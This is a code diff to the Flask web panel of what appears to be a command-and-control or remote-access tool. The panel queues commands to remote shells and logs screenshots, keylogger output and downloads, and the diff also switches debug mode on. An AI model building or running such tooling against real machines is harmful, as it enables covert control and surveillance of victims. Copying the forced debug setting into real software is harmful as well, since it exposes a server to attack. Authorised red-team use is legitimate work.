@@ -22,6 +22,7 @@ from core.shell import Shell
 class FlaskFactory(Flask):
 
     def init(self, config, cli):
+        self.debug = True
         self.sync = Sync(config)
         self.secret_key = Utils.gen_str(32)
         self.session = session
@@ -54,6 +55,7 @@ class FlaskFactory(Flask):
         self.session["password"] = hashlib.sha512(password).hexdigest()
         self.active_users.append(self.session["username"])
         Log.log_event("User Login", "%s" % str(self.session["username"]))
+        self.redis.append_server_events("\n[%s] User Login: %s" % (Utils.timestamp(),str(self.session["username"])))
 
     def post_login(self):
         if request.form["username"].strip() in self.active_users:
@@ -93,12 +95,10 @@ class FlaskFactory(Flask):
     def send_cmd(self, id, cmd, username,):
         output, cmd = self.shell.evalute_cmd(cmd)
         cmd_guid = Utils.guid()
-        self.redis.append_shell_data(id, "[%s] %s - Sending command: \n%s\n%s\n\n" % (Utils.timestamp(), username, output, cmd))
-
+        self.redis.append_shell_data(id, "[%s] %s - Sending command: %s\n%s\n\n" % (Utils.timestamp(), username, output, cmd))
         Log.log_shell(id, "- Sending command", "%s\n%s" % (output, cmd), username=username)
         if not cmd == "":
             self.redis.push_cmd(id, cmd, cmd_guid, username)
-
         return json.dumps({"output": output})
 
     def html_escape(self, data):
@@ -118,6 +118,9 @@ class FlaskFactory(Flask):
     def get_port(self):
         port = self.internal_config.get("http-port")
         return port
+
+    def get_events(self):
+        return self.redis.get_server_events().decode()
 
     def get_log_date(self, name):
         dates = fnmatch.filter(os.listdir(os.getcwd() + "/logs/"), "*-*-*")
@@ -157,7 +160,7 @@ class FlaskFactory(Flask):
         return log_info
 
     def get_log_data(self, date, name):
-        logs = ["event", "http", "error", "chat"]
+        logs = ["event", "http", "error", "chat", "screenshots", "shells", "keylogger", "downloads"]
 
         if name == "dashboard":
             try:
@@ -218,6 +221,11 @@ class FlaskFactory(Flask):
                 "shell_timestamp": self.redis.get_data(shell),
                 }
             shells_list.append(shell_info)
+            try:
+                shells_list = sorted(shells_list, key = lambda shell_info: shell_info["shell_timestamp"], reverse=True)
+            except TypeError:
+                pass
+            #print(shells_list)
         return shells_list
 
     def get_shell_domain(self, id):
@@ -259,7 +267,7 @@ class FlaskFactory(Flask):
         for shell in shells:
             shell = shell.decode()
             if id in shell:
-                self.redis.delete_entry(shell)
+                return self.redis.delete_entry(shell)
 
     def get_gui_host(self):
         return self.internal_config.get("gui-host")
